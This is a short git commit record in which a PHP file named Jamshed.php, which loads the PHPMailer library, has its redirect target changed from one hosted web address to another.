b7f9860b0b4acadb443a27ac0b93555cf4f4a5d5
adiwalfare <ronimawiads@gmail.com>
2025-07-15 10:16:43 +0500

    Update Jamshed.php

--- Jamshed.php
+++ Jamshed.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://jamshed-p.vercel.app/");
+header("Location: https://dynamic-otter-8cfede.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
